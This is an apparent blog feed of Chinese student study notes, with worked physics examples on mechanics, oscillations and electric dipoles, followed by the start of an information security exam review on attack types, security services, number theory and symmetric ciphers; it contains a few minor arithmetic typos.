<p>以小球为研究对象，根据题意，由于轻绳作用在小球上的力始终通过小孔即圆周运动的中心，为有心力，所以小球受轻绳的拉力大小对小孔的力矩始终为零。因此，在小球整个运动过程中角动量守恒。设小球质量为m，圆周运动半径$r_0=40cm$时其运动速率为$v$，则角动量守恒定律可得</p><p>$mv_0r_0=mvr$</p><p>又由于轻绳对小球的拉力等于小球圆周运动的向心力，所以有</p><p>$F=\frac{mv_0^2}{r_0}$</p><p>由以上两式可得</p><p>$v_0=\sqrt{\frac{Fr_0}{m}}=\sqrt{\frac{10^{-3}\times 40\times 10^{-2}}{10\times10^{-3}}}m/s=0.2m/s$</p><p>$v=\frac{r_0}{r}v_0=\frac{40}{10}\times 0.2m/s=0.8m/s$</p><p>再由质点的动能定理可得，轻绳拉力所做的功为</p><p>$A=\frac{1}{2}mv^2-\frac{1}{2}mv_0^2=\frac{1}{2}m(v^2-v_0^2)=\frac{1}{2}\times 10\times 10^{-3}\times(0.8^2-0.2^2)J=3.0\times10^{-3}J$</p>              </div>            </details></li><li><p>例题1.10（P31）</p><blockquote><p>如图所示，我国第一颗人造卫星“东方红”绕地球运行的轨道为一椭圆，地球的中心$O$在椭圆的一个焦点上。已知地球的平均半径为$R=6.371\times10^6m$，卫星在近地点A时，距地面的距离为$l_1=4.39\times10^5$，速率为$v_1=8.1\times10^3m/s$，在远地点B时距离地面的距离$l_2=2.384\times10^6m$，求卫星在远地点B时的速率$v_2$。</p><img src="https://oss.iuoyt.com/img/posts/image-20240623162959885.png" alt="例题1.10" style="zoom: 50%;" /></blockquote> <details class="folding-tag" ><summary> 查看解答 </summary>              <div class='content'>              <p>由于卫星在轨道上运动受地球的引力始终指向地心$O$，引力对地心$O$的力矩为零，所以卫星对地心$O$的角动量守恒</p><p>卫星在近地点的角动量为$L_1=mv_1(R+l_1)$</p><p>卫星在远地点的角动量为$L_2=mv_2(R+l_2)$​</p><p>因为角动量守恒，所以$mv_1(R+l_1)=mv_2(R+l_2)$</p><p>于是$v_2=v_1\frac{R+l_1}{R+l_2}$</p><p>将$R、l_1、l_2、v_1$代入，得</p><p>$v_2=v_1\frac{R+l_1}{R+l_2}=\frac{(6.371\times10^6+4.39\times10^5)\times8.1\times10^3}{6.371\times10^+2.384\times10^6}m/s\approx6.30\times10^3m/s$</p>              </div>            </details></li><li><p>例题1.11（P34）</p><blockquote><p>如图所示，两个质量均为m的小球A与B分别悬挂在长度为$2l$和$l$的轻质细绳上，两球碰撞时的恢复系数$e=0.414$。球A与竖直方向的夹角为$\theta$位置处静止释放，下落到竖直方向时与球B正碰，刚好使球B到达与竖直方向的夹角为60°的位置处，那么$\theta$应为多大？</p><img src="https://oss.iuoyt.com/img/posts/image-20240623164218976.png" alt="例题1.11" style="zoom:33%;" /></blockquote> <details class="folding-tag" ><summary> 查看解答 </summary>              <div class='content'>              <p>以地球为参考系，问题可分解为三个过程：</p><p>碰前：球A从$\theta$角位置处静止释放，夏洛到竖直方向还没与球B碰撞的过程。以球A和地球为研究系统，该过程中只有重力做功，系统的机械能守恒。取落至竖直位置时球A的速度大小为$v$，方向水平向左，则由系统的机械能守恒定律得</p><p>$\frac{1}{2}mv^2=mg·2l(1-\cos\theta) ······①$</p><p>碰时：球A与球B碰撞发生非完全弹性碰撞，可以用动量守恒定律近似求解。设碰后球A与球B的速度大小分别为$v_A、v_B$并水平向左，则由动量守恒定律，得</p><p>$mv_A+mv_B=mv······②$</p><p>由碰撞定律可得$e=\frac{v_B-v_A}{v}······③$</p><p>碰后：球B从竖直方向达到与竖直方向呈60°夹角位置处的过程。以球B和地球为研究系统，该过程中只有重力做功，系统的机械能守恒。取竖直位置时球B所在之处为重力势能零点，则由系统的机械能守恒定律得</p><p>$\frac{1}{2}mv_B^2=mg·l(1-\cos60°)······④$</p><p>将式①~④联立代入数据得</p><p>$\cos\theta=1-\frac{1}{(1-e)^2}=1-\frac{1}{(1+0.414)^2}\approx\frac{1}{2}$​</p><p>所以$\theta=60°$</p>              </div>            </details></li></ol><h3 id="转动惯量（2-2-3）">转动惯量（2.2.3）</h3><ol><li><p>例题2.2（P47）</p><blockquote><p>如图所示为质量为$m$，长度为$l$的均匀细棒AB，求该细棒对下两种转轴的转动惯量：</p><ol><li>转轴通过棒的中心并和棒垂直（a）</li><li>转轴通过棒的一端并和棒垂直（b）</li></ol><img src="https://oss.iuoyt.com/img/posts/image-20240623165537774.png" alt="例题2.2" style="zoom: 50%;" /></blockquote> <details class="folding-tag" ><summary> 查看解答 </summary>              <div class='content'>              <ol><li><p>取坐标系如图(a)所示，在棒上距原点$x$处取一长度元$\mathrm{d}x$，设棒的质量线密度为$\lambda$，则该长度元的质量$\mathrm{d}m=\lambda\mathrm{d}x=\frac{m}{l}\mathrm{d}x$。由转动惯量定义，此时棒的转动惯量为</p><p>$I_C=\int_{-\frac{l}{2}}^{\frac{l}{2}}x^2\mathrm{d}m=2\int_{0}^{\frac{l}{2}}x^2\frac{m}{l}\mathrm{d}x=\frac{1}{12}ml^2$​</p></li><li><p>当转轴通过棒的一端并和棒垂直时，取坐标系如(b)所示，此时棒的转动惯量为</p><p>$I_A=\int_0^lx^2\frac{m}{l}\mathrm{d}x=\frac{1}{3}ml^2$</p><p>上述结果表明，同一个物体对于不同的转轴，其转动惯量不同，可见转动惯量与转轴位置有关。由于通过棒的中心并和棒垂直的转轴与通过棒的一端并和棒垂直的转轴之间的垂直距离为$\frac{l}{2}$，应用平行轴定理，有</p><p>$I_A=I_C+m(\frac{l}{2})^2=\frac{1}{12}ml^2+\frac{1}{4}ml^2=\frac{1}{3}ml^2$</p></li></ol>              </div>            </details></li><li><p>例题2.3（P48）</p><blockquote><p>如图所示，求半径为R、质量为m的均匀薄圆环绕垂直环面通过中心转轴的转动惯量。若把圆环改为圆盘，其他条件都不变，试再求之。</p><img src="https://oss.iuoyt.com/img/posts/image-20240623172450461.png" alt="例题2.3" style="zoom:50%;" /></blockquote> <details class="folding-tag" ><summary> 查看解答 </summary>              <div class='content'>              <p>由于均匀薄圆环中的所有质元都离轴等距离，R为常量。故由转动惯量定义，有</p><p>$I=\int r^2\mathrm{d}m=R^2\int \mathrm{d}m=mR^2$</p><p>若把圆环改为圆盘，由于圆盘可看成由许多半径不同的同心圆环组成，在圆盘上取一半径为$r$，宽度为$\mathrm{d}r$的圆环，其面积$\mathrm{d}S=2\pi r\mathrm{d}r$，其质量$\mathrm{d}m=\sigma\mathrm{d}S$，其中$\sigma=\frac{m}{\pi R^2}$是圆盘的质量面密度。由此，小圆环对转轴的转动惯量为</p><p>$\mathrm{d}I=r^2\mathrm{d}m=r^2\sigma\mathrm{d}S=\frac{2m}{R^2}r^3\mathrm{d}r$</p><p>于是整个圆盘对转轴的转动惯量为</p><p>$I=\int_mr^2\mathrm{d}m=\frac{2m}{R^2}\int_0^Rr^3\mathrm{d}r=\frac{1}{2}mR^2$</p>              </div>            </details> <details class="folding-tag" ><summary> 几种常见刚体的转动惯量 </summary>              <div class='content'>              <img src="https://oss.iuoyt.com/img/posts/image-20240623174615431.png" alt="几种常见刚体的转动惯量" style="zoom:50%;" />              </div>            </details></li></ol><h3 id="简谐振动运动学方程（8-1-2）">简谐振动运动学方程（8.1.2）</h3><ol><li><p>例题8.1(P238)</p><blockquote><p>一物体沿x轴做简谐振动，平衡位置在坐标原点O，振幅$A=0.06m$，周期$T=2s$，当$t=0$时，物体的位移$x=0.03m$，且向x轴正方向运动。求：</p><ol><li>此简谐振动的运动学方程</li><li>$t=0.5s$时物体的位移、速度和加速度</li></ol></blockquote> <details class="folding-tag" ><summary> 查看解答 </summary>              <div class='content'>              <ol><li><p>设该简谐振动的运动学方程为$x=A\cos(\omega t+\varphi)$</p><p>则速度为$v=-A\omega\sin(\omega t+\varphi)$</p><p>式中，$A=0.06m,\omega=\frac{2\pi}{T}=\pi\mathrm{rad/s}$，将二者与初始条件$t=0$时，$x=0.03m$代入振动的运动学方程得$0.03=0.06\cos\varphi$</p><p>解得$\cos\varphi=\frac{1}{2},\varphi=\pm\frac{\pi}{3}$</p><p>又因为$t=0$时，物体向x轴正方向运动，即$v=-A\omega\sin\varphi\gt0$</p><p>所以初相位应取$\varphi=-\frac{\pi}{3}$</p><p>因此该振动的运动学方程为$x=0.06\cos(\pi t-\frac{\pi}{3})$（SI单位）</p></li><li><p>当$t=0.5s$时，物体的位移为</p><p>$x=0.06\cos(0.5\pi-\frac{\pi}{3})\mathrm{m}=0.03\sqrt{3}\mathrm{m}\approx0.052\mathrm{m}$</p><p>物体的速度为</p><p>$v=-0.06\pi\sin(0.5\pi-\frac{\pi}{3})\mathrm{m/s}=-0.03\pi\mathrm{m/s}\approx-0.094\mathrm{m/s}$</p><p>物体的加速度为</p><p>$a=-0.06\pi^2\cos(0.5\pi-\frac{\pi}{3})\mathrm{m/s^2}=0.03\sqrt{3}\pi^2\mathrm{m/s^2}\approx-0.51\mathrm{m/s^2}$</p></li></ol>              </div>            </details></li><li><p>例题8.2（P241）</p><blockquote><p>质量为0.2kg的物体，以振幅$A=5cm$做简谐振动，其最大加速度$a_{max}=0.2\mathrm{m/s^2}$</p><ol><li>求振动的周期</li><li>求通过平衡位置时的动能</li><li>求总能量</li><li>物体在何处动能和势能相等</li></ol></blockquote> <details class="folding-tag" ><summary> 查看解答 </summary>              <div class='content'>              <ol><li><p>因为$a_{max}=A\omega^2$，所以</p><p>$\omega=\sqrt{\frac{a_{max}}{A}}=\sqrt{\frac{0.2}{0.05}}\mathrm{rad/s}=2\mathrm{rad/s}$</p><p>浴室振动的周期为$T=\frac{2\pi}{\omega}=\frac{2\pi}{2}\mathrm{s}\approx3.14\mathrm{s}$</p></li><li><p>因为物体通过平衡位置时速度最大，即动能也最大，所以</p><p>$E_{k,max}=\frac{1}{2}m\omega^2A^2=\frac{1}{2}\times0.2\times2^2\times0.05^2\mathrm{J}=10^{-3}\mathrm{J}$</p></li><li><p>总能量为$E=E_{k,max}=10^{-3}\mathrm{J}$</p></li><li><p>当$E_k=E_p$时，有</p><p>$E_k=E_p=\frac{1}{2}E=0.5\times10^{-3}\mathrm{J}$</p><p>而$E_p=\frac{1}{2}kx^2=\frac{1}{2}m\omega^2x^2$</p><p>故$x=\sqrt{\frac{2E_p}{m\omega^2}}=\sqrt{\frac{2\times0.5\times10^{-3}}{0.2\times2^2}}\mathrm{m}=\frac{\sqrt{2}}{4}\times10^{-1}\mathrm{m}\approx0.035\mathrm{m}$</p></li></ol>              </div>            </details></li></ol><h3 id="电偶极子的场强（5-2-1）">电偶极子的场强（5.2.1）</h3><p>例题5.3（P116）</p><blockquote><p>相距为$l$的一对等量异号点电荷系统称为电偶极子。由负电荷指向正电荷的矢量（径矢）作为电偶极子的轴线的正方向，由电荷量$q$与径矢$l$的乘积定义为电偶极矩，简称电距（矢量），用$p$表示，$p=ql$​，求真空中电偶极子轴线延长线和中垂线上的场强。</p><img src="https://oss.iuoyt.com/img/posts/image-20240623175228902.png" alt="例题5.3" style="zoom: 50%;" /></blockquote><details class="folding-tag" ><summary> 查看解答 </summary>              <div class='content'>              <ol><li><p>轴线延长线上P点的场强</p><p>如图(a)所示，设点电荷$+q$和$-q$轴线的中点到轴线延长线上一点P点的距离为$r(r\gg l)$，$+q$和$-q$在P点产生的场强大小分别为</p><p>$E_+=\frac{1}{4\pi\epsilon_0}\frac{q}{(r-\frac{l}{2})^2}$（方向向右）</p><p>$E_-=\frac{1}{4\pi\epsilon_0}\frac{q}{(r+\frac{l}{2})^2}$​（方向向左）</p><p>求$E_+$和$E_-$的矢量和就相当于求代数和，因此P点的合场强$E_P$的大小为</p><p>$E_P=E_++E_-=\frac{q}{4\pi\epsilon_0}[\frac{1}{(r-\frac{l}{2})^2}-\frac{1}{(r+\frac{l}{2})^2}]=\frac{1}{4\pi\epsilon_0r^3}\frac{2ql}{(1-\frac{l}{2r})^2(1+\frac{l}{2r})^2}$​</p><p>因为$r&gt;&gt;l$，所以</p><p>$E_P\approx\frac{2ql}{4\pi\epsilon_0r^3}=\frac{2p}{4\pi\epsilon_0r^3}$​（方向向右）</p><p>写成矢量式为$E_P=\frac{2p}{4\pi\epsilon_0r^3}$</p><p>$E_P$的方向与电矩$p$​的方向一致。</p></li><li><p>中垂线上P点的场强</p><p>如图(b)所示，设点电荷$+q$和$-q$轴线的中点到中垂线上一点P点的距离为$r(r\gg l)$，$+q$和$-q$​在P点产生的场强大小分别为</p><p>$E_+=E_-=\frac{1}{4\pi\epsilon_0}\frac{q}{(r^2+\frac{l^2}{4})}$</p><p>合场强的大小为</p><p>$E_P=2E_+\cos\alpha=2\frac{1}{4\pi\epsilon_0}\frac{q}{(r^2+\frac{l^2}{4})}·\frac{\frac{l}{2}}{(r^2+\frac{l^2}{4})^{\frac{1}{2}}}$</p><p>因此，简化为</p><p>$E_P=\frac{1}{4\pi\epsilon_0}\frac{ql}{(r^2+\frac{l^2}{4})^{\frac{3}{2}}}$​</p><p>由于$r\gg l$，所以</p><p>$E_P\approx\frac{ql}{4\pi\epsilon_0r^3}=\frac{1}{4\pi\epsilon_0}\frac{p}{r^3}$​</p><p>$E_P$的方向与电矩的方向相反，故写成矢量式为</p><p>$E_P=-\frac{1}{4\pi\epsilon_0}\frac{p}{r^3}$</p></li></ol>              </div>            </details><h3 id="热力学基础">热力学基础</h3><ol><li><p>例题3.2</p><blockquote><p>设空气可视为各处温度均为T的理想气体,试求大气压强随高度的变化规律.</p></blockquote> <details class="folding-tag" ><summary> 查看解答 </summary>              <div class='content'>              <img src="https://oss.iuoyt.com/img/posts/62582da19a5aa40cd904c4d8a62ddfc.png" alt="例题3.2" style="zoom:67%;" />              </div>            </details></li></ol><h3 id="电磁感应">电磁感应</h3><ol><li><p>例题7.4</p><blockquote><p>半径为R的圆柱形无限长螺线管中存在均磁场B，而且dB/dt为一大于零的常量，试求螺线管内外感生电场的分布.</p></blockquote> <details class="folding-tag" ><summary> 查看解答 </summary>              <div class='content'>              <img src="https://oss.iuoyt.com/img/posts/66ee02cd1dd56ae38d41c1986d188b8.png" alt="例题7.4" style="zoom:67%;" />              </div>            </details></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学期总结 </tag>
            
            <tag> 大学物理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全技术期末复习</title>
      <link href="/posts/f546d1cf.html"/>
      <url>/posts/f546d1cf.html</url>
      
        <content type="html"><![CDATA[<h2 id="引言">引言</h2><h3 id="安全攻击">安全攻击</h3><blockquote><p>⭐️被动攻击和主动攻击的分类</p></blockquote><div class="note info simple"><p>安全攻击是危及信息系统安全的活动，即信息在存储、共享和传输中，可能会被非法窃听、截取、篡改和破坏的活动。</p></div><ul><li>安全攻击包括两类：<ul><li>被动攻击<ul><li>目的：获得传输的信息，不对信息作任何改动</li><li>威胁信息的保密性</li><li><strong>举例：消息内容的泄漏、流量分析</strong></li></ul></li><li>主动攻击（主动破坏数据）<ul><li>目的：篡改 / 伪造信息、改变系统的状态和操作</li><li>威胁信息的完整性、可用性和真实性</li><li><strong>举例：伪装、篡改、重放、拒绝服务</strong></li></ul></li></ul></li><li>常见的安全攻击如下：<ul><li>消息内容的泄漏：消息的内容被泄露或透露给某个非授权的实体</li><li>流量分析：通过分析通信双方的标识、通信频度、消息格式等信息来达到自己的目的</li><li>篡改：指对合法用户之间的通信消息进行修改或者改变消息的顺序</li><li>伪装：指一个实体冒充另一个实体</li><li>重放：将获得的信息再次发送以期望获得合法用户的利益</li><li>拒绝服务：指阻止对信息或其他资源的合法访问。</li></ul></li></ul><h3 id="安全服务">安全服务</h3><blockquote><p>⭐️安全服务的分类，CIA（基本）</p></blockquote><p>X.800把安全服务划分为5类服务。</p><ol><li><p>认证：确保通信实体就是它所声称的那个实体</p><ul><li><p>对等实体认证：同逻辑连接一起使用，用以提供对连接双方实体的机密性保证</p></li><li><p>数据源认证：在非连接传输中，确保数据来源与所声称的一致</p></li></ul></li><li><p>访问控制：防止对资源的非授权使用</p></li><li><p>数据机密性：防止非授权的数据泄露</p><ul><li><p>连接机密性：对连接中所有用户的数据的保护</p></li><li><p>无连接机密性：对单一数据块中的所有用户数据的保护</p></li><li><p>选择域机密性：在连接或单一数据块上的用户数据中的选择域的机密性</p></li><li><p>流量机密性：对可能从流量中获取的信息的保护</p></li></ul></li><li><p>数据完整性：确保被认证实体发送的数据与接收到的数据完全相同（无篡改、插入、删除或重放）</p><ul><li><p>带有恢复的连接完整性：确保连接中所有用户数据的完整性，检测实体数据序列中任意的改写、插入、删除或重放，并尝试恢复数据</p></li><li><p>无恢复的连接完整性：检测数据完整性，单不进行恢复操作</p></li><li><p>选择域连接的完整性：在一个连接中，提供对传输数据块中用户数据选择域的完整性保证，并且裁决选择域中的数据是否被篡改、插入、删除或重放</p></li><li><p>无连接的完整性：对单一无连接数据块提供完整性保证并且可能对数据篡改进行检测。此外也可以提供有限的重放数据检测</p></li></ul></li><li><p>不可抵赖性：提供对被全程参与或部分参与通信的实体拒绝的防范</p><ul><li><p>源不可抵赖性：证明消息由特定一方发出</p></li><li><p>目的地不可抵赖性：证明消息由特地一方接收</p></li></ul></li></ol><h3 id="安全机制">安全机制</h3><div class="note info simple"><p>安全机制即阻止安全攻击及恢复系统的机制，OSI 安全框架将安全机制分为特定安全机制和普遍安全机制</p></div><ul><li>特定安全机制：<ul><li>描述：在同一时间只针对一种安全服务实施一种技术或软件</li><li>举例：加密、数字签名、访问控制、数据完整性、认证交换、流量填充、路由控制和公证</li></ul></li><li>普遍安全机制：<ul><li>描述：普遍安全机制不能应用到 OSI 参考模型的任一层上</li><li>举例：可信功能机制、安全标签机制、事件检测机制、审计跟踪机制、安全恢复机制</li></ul></li></ul><h2 id="数学基础">数学基础</h2><h3 id="数论">数论</h3><h4 id="扩展欧几里得算法（辗转相除法）">扩展欧几里得算法（辗转相除法）</h4><blockquote><p>（扩展的）欧几里得算法：求模逆元（具体过程不要求）</p></blockquote><p>在密码学特别是非对称密码体制中，常常需要求模逆元，求模逆元就是求乘法逆元。即已知$a$和$b$，寻找一个$x$，使得$a\times x\equiv1\bmod b$成立，即求出可使得$1=a\times x-b\times n$（顺序为$a$在前，$b$在后）成立的$x$。模逆元不一定存在结果，通常用欧几里得算法求出。</p><details class="folding-tag" ><summary> 举例 </summary>              <div class='content'>              <blockquote><p>求$5^{-1}\bmod18$</p></blockquote><p>①求18对5的余数：<i style="color: red">$3$</i>$=18-5\times$<i style="color: red">$3$</i></p><p>②将3作为除数，求5对3的余数：<i style="color: red">$2$</i>$=5-3\times$<i style="color: red">$1$</i></p><p>③将2作为除数，求3对2的余数：<i style="color: red">$1$</i>$=3-2\times$<i style="color: red">$1$</i></p><p>④（已求得余数为1）将③中的非$a,b$的数用①和②表示：</p><p>$1=3-($<i style="color: red">$5-3\times1$</i>$)\times1=($<i style="color: blue">$18-5\times3$</i>$)-[5-($<i style="color:blue">$18-5\times 3$</i>$)\times1]\times1=18\times2-5\times7$</p><p>⑤表示为$ax-bn$形式：$18\times2-5\times7=5\times(-7)-18\times(-2)=5\times11-18\times3$</p><p>⑥则模逆元为11</p>              </div>            </details><details class="folding-tag" ><summary> 更多例题 </summary>              <div class='content'>              <ol><li>$1234^{-1}\bmod 4321$</li><li>$24140^{-1}\bmod40902$</li><li>$550^{-1}\bmod1769$</li></ol>              </div>            </details><h4 id="费马定理">费马定理</h4><div class="note info simple"><p>若$p$是素数，且$a$是正整数，且$gcd(a,p)=1$，则$a^{p-1}\equiv 1(\bmod p)$。</p></div><details class="folding-tag" ><summary> 例$a=7，p=19$ </summary>              <div class='content'>              <p>$a=7,p=19,gcd(a,p)=1$</p><p>$7^2=49\equiv 11\bmod 19$</p><p>$7^4\equiv 121\bmod 19\equiv 7\bmod 19$</p><p>$7^8\equiv49\bmod 19\equiv 11\bmod 19$</p><p>$7^{16}\equiv 121\bmod 19 \equiv 7 \bmod 19$</p><p>$a^{p-1}=7^{18}=7^{16}\times 7^2\equiv 7\times 11\bmod 19\equiv 1\bmod 19$</p>              </div>            </details><p>推论（费马定理另一种表现形式）：</p><div class="note info simple"><p>设$p$是素数，对于任意正整数$a$，则$a^p\equiv a(\bmod p)$。</p></div><p>推论不要求$gcd(a,p)=1$，即$a,p$​互素</p><h4 id="欧拉定理">欧拉定理</h4><div class="note info simple"><p>对于任意互素的两个整数$a,n$，有：$a^{\varphi (n)}\equiv 1\bmod m$​。</p></div><blockquote><p>欧拉函数$\varphi(n)$：</p><div class="note info simple"><p>设$\varphi (m)$为小于或等于$m$且与$m$​互素的正整数个数，则称其为<strong>欧拉(Euler)函数</strong></p></div><details class="folding-tag" ><summary> 欧拉函数举例 </summary>              <div class='content'>              <blockquote><p>$\varphi(1)=1$：1</p><p>$\varphi(2)=1$：1</p><p>$\varphi(3)=2$：1、2</p><p>$\varphi(5)=4$：1、2、3、4</p><p>$\varphi(8)=4$：1、3、5、7</p></blockquote>              </div>            </details></blockquote><details class="folding-tag" ><summary> 欧拉定理举例 </summary>              <div class='content'>              <p>$a=3,n=10$：$\varphi (10)=4,a^{\varphi(n)}=3^4=81\equiv 1\bmod 10=1\bmod n$</p><p>$a=2,n=11$：$\varphi(11)=10,a^{\varphi (n)}=3^{10}=1024\equiv1\bmod 11=1\bmod n$</p>              </div>            </details><p>对于欧拉定理，有：</p><ul><li>当$n=p$时，有$a^{p-1}\equiv 1\bmod p$，为费马定理</li><li>易见$a^{\varphi (n+1)}\equiv a\bmod n$（欧拉定理的另一种形式不要求$a$和$n$互素）</li></ul><details class="folding-tag" ><summary> 求$13^{2001}$被$60$除所得的余数 </summary>              <div class='content'>              <p>$\because gcd(13,60)=1$</p><p>$\therefore 13^{\varphi (60)}\equiv 1(\bmod 60)$</p><p>$\because \varphi (60)=\varphi (2^2\times 3\times 5)=2\times(3-1)\times(5-1)=16$，$2001=125\times 16+1$</p><p>$\therefore 13^{16}\equiv 1(\bmod 60)$，$13^{2001}=(13^{16})^{125}\times 13\equiv 13(\bmod 60)$</p><p>即被60除所得的余数为13</p>              </div>            </details><h4 id="中国剩余定理">中国剩余定理</h4><blockquote><p>中国剩余定理：求解同余方程组</p></blockquote><div class="note info simple"><p>设$m_1,m_2,\dots ,m_k$​是两两互素的正整数，令</p><center>$M=m_1m_2\dots m_k=m_1M_1=m_2M_2=\dots=m_kM_k$</center><p>上式中$M_i=\frac{M}{m_i},i=1,2\dots,k$，则同时满足同余方程组</p><center>$x\equiv b_i\bmod m_i\quad(i=1,2,\dots,k)$</center><p>的唯一正整数解$x_0$是：</p><center>$x_0=(b_1M^{\prime}_{1}M_1+b_2M^{\prime}_{2}M_2+\dots+b_kM^{\prime}_{k}M_k)\bmod M$</center><p>上式中$M^{\prime}_{i}$是$M_i$以$m_i$为模的逆元。</p></div><details class="folding-tag" ><summary> 求解$x$举例 </summary>              <div class='content'>              <blockquote><p>求解满足以下方程的解$x$：</p><center>$x\equiv 1\bmod 2$​</center><center>$x\equiv 2\bmod 3$</center><center>$x\equiv 3\bmod 5$</center><center>$x\equiv 5\bmod 7$</center></blockquote><p>$M=m_1m_2m_3m_4=2\times 3\times 5\times 7=210$</p><p>$M_1=105,M_2=70,M_3=42,M_4=30$</p><p>由扩展欧几里得定理：</p><center>$M^{-1}_{1}\bmod 2\equiv 1\quad M^{-1}_{2}\bmod 3\equiv 1\quad M^{-1}_3\bmod 5\equiv 3\quad M^{-1}_4\bmod 7\equiv 4$</center>​<p>$\therefore x\bmod 210\equiv(1\times 105\times 1+ 2\times 70\times 1+3\times 42\times 3+5\times 30\times 4)\bmod 210\equiv 173$</p><p>即$x\equiv 173\bmod 210$</p>              </div>            </details><h3 id="代数">代数</h3><h4 id="群">群</h4><blockquote><p>群的概念：如$Z_n$​​（n为合数，即非素数）关于模n乘法运算不构成群</p><div class="note info simple"><p>用$Z_m$表示正整数{$0,1,\dots,m-1$}的集合</p></div></blockquote><ul><li>群定义了一个二元运算的集合，这个二维运算可以表示为$\cdot$（具有一般性，可以指任何数学运算），群$G$记作{$G,\cdot$}，$G$中的每一个序偶$(a,b)$通过运算生成$G$中的元素$(a\cdot b)$​。</li><li>如果一个群的元素个数是有限的，则该群称为有限群。并且群的阶等于群中元素的个数。否则，称该群为无限群。</li><li>满足以下原则：<ul><li>封闭性：如果$a$和$b$都属于$G$，则$a\cdot b$也属于$G$</li><li>结合律：对于$G$中的任何元素$a、b、c$都有$a\cdot (b\cdot c)=(a\cdot b)\cdot c$​成立</li><li>单位元：$G$中存在一个元素$e$，对于$G$中任意元素$a$，都有$a\cdot e=e\cdot a=a$成立</li><li>逆元：对于$G$中任意元素$a$，$G$中都存在一个元素$a^{\prime}$，使得式$a\cdot a^{\prime}=a^{\prime}\cdot a=e$​成立</li><li>交换律：对于$G$中的任意元素$a,b$，都有$a\cdot b=b\cdot a$成立</li></ul></li></ul><h4 id="有限域">有限域</h4><blockquote><p>有限域的阶必为素数$p$的幂$p^n$​</p><blockquote><p>判断方法即是否可以表示成$p^n$</p></blockquote></blockquote><div class="note info simple"><p>对任意素数$p$和正整数$n$，存在$p^n$阶的有限域，记为$GF(P^n)$。当$n=1$时有限域$GF§$​也称为素域。</p></div><p>定义：</p><ol><li>有限域中元素的个数称为有限域的阶</li><li>有限域的阶必为素数$p$的幂$p^n$，$n$为正整数</li></ol><h4 id="域上多项式">域上多项式</h4><blockquote><p>如$GF(2^8)$上的运算，对称加密AES</p></blockquote><div class="note info simple"><p>域$F$上的$n(n\ge 0)$​次多项式表示为：</p><center>$f(x)=a_nx^n+a_{n-1}x^{n-1}+\cdots+a_1x+a_0=\sum_{i=0}^na_ix^i$</center><p>其中系数$a_i$是域$F$中的元素。</p></div><h2 id="对称加密和消息机密性">对称加密和消息机密性</h2><h3 id="对称加密原理">对称加密原理</h3><ul><li>一对保密密钥相等或互相容易推算，又称为单密钥密码机制。</li><li>（加密和解密采用相同的密钥）</li></ul><h3 id="对称加密算法">对称加密算法</h3><h4 id="Feistel结构">Feistel结构</h4><blockquote><p>了解具体结构图，根据图写出加密过程</p></blockquote><ul><li><p>分组大小：越大的分组意味着越高的安全性，但减小了加密/解密速率（折中128bit）</p></li><li><p>密钥大小：越长的密钥意味着越高的安全性（128bit）</p></li><li><p>迭代轮数：多轮处理能提供更高的安全性。（16轮）</p></li><li><p>子密钥生成算法：此算法复杂度越高，密码破译难度就越高</p></li><li><p>快速软件加密/解密：软件执行速度成为一个重要因素</p></li><li><p>易于分析：便于掌握算法的保密强度以及扩展办法</p><p><img src="https://img-blog.csdnimg.cn/img_convert/18d21b4c5e1416a5df04d88ea64e8702.png" alt="img"></p></li><li><p>过程：</p><ul><li>每一轮的左半部分是上一轮的右半部分<br>每一轮的右半部分是 （上一轮的右半部分进入一个F操作，且要输入这一轮的密钥$K_i$，然后产生的解再与上一轮的左半部分进行异或操作</li></ul><p><img src="https://img-blog.csdnimg.cn/img_convert/414d676431f8a43926b7832da72db788.png" alt="图片来源：CSDN-Ferry_xie"></p></li></ul><h4 id="分组密码：">分组密码：</h4><h5 id="DES（数据加密标准）">DES（数据加密标准）</h5><ul><li>最广泛使用的加密方案，算法被称为数据加密算法 (DEA) 。DES是一个分组密码，明文长度为64bit，密钥长度为56bit，16轮迭代。</li><li>工作原理：<ul><li>加密：用Key去把数据Data进行加密， 生成Data的密码形式（64位）作为DES的输出结果</li><li>解密：用Key去把密码形式的数据Data解密，还原为Data的明码形式（64位）作为DES的输出结果</li></ul></li></ul><h5 id="AES（高级加密标准）">AES（高级加密标准）</h5><ul><li>和DES有等同或更高的安全强度，并且效率有显著提高</li><li>支持的分组大小为128、192和256bit</li><li>支持密钥长度为128、192和256bit</li></ul><h5 id="IDEA（International-Data-Encryption-Algorithm）">IDEA（International Data Encryption Algorithm）</h5><ul><li>目标：密码强度；使用的方便性。</li><li>密码强度：<ul><li>分组长度：64bit分组</li><li>密钥长度：128bit；</li><li>扰乱：用三种操作达到扰乱的目的；</li><li>扩散：IDEA密码的扩散效果也很有效。</li></ul></li><li>实现方面的考虑：软件和硬件的实现</li></ul><h5 id="SM4（SMS4中国商用密码算法）">SM4（SMS4中国商用密码算法）</h5><ul><li>分组长度：128bit</li><li>密钥长度：128bit</li><li>迭代轮数：32轮</li><li>非对称的Feistel结构</li></ul><h4 id="流密码：RC4">流密码：RC4</h4><ul><li>流密码的设计思想：<ul><li>加密序列应该有一个长周期</li><li>密钥流应该尽可能地接近真随机数的性质</li><li>为了抵抗穷举攻击，密钥必须足够长 （128bit）</li></ul></li><li>RC4：1987，Ron Rivest为RSA Secutity公司设计 的流密码，用于SSL/TLS，IEEE 802.11 WEP和WAP等协议中</li></ul><h3 id="分组密码的工作模式">分组密码的工作模式</h3><h4 id="EC（ECB）">EC（ECB）</h4><p>电子簿模式(electronic codebook mode)，明文一次被处理64bit，而且明文的每一个分组都使用同一密钥加密。（安全性不好，会出错，一般不用）</p><ul><li>相同明文对应相同密文</li><li>同样信息多次出现造成泄漏</li><li>信息块可被替换</li><li>信息块可被重排</li><li>密文块损坏对应明文块损坏</li><li>适合于传输短信 息</li></ul><h4 id="CBC">CBC</h4><p>密码块链接(cipher block chaining)，加密算法的输入是当前明文分组与前一密文分组的异或</p><ul><li>需要共同的初始化向量</li><li>相同明文-&gt;不同密文</li><li>初始化向量可以用来改变第一块</li><li>密文块损坏-&gt;两明文块损坏</li><li>安全性好于ECB</li></ul><h4 id="CFB">CFB</h4><p>密码反馈方式(cipher feedback)，将任意分组密码转化为流密码</p><h4 id="CRT">CRT</h4><p>计数器模式(counter 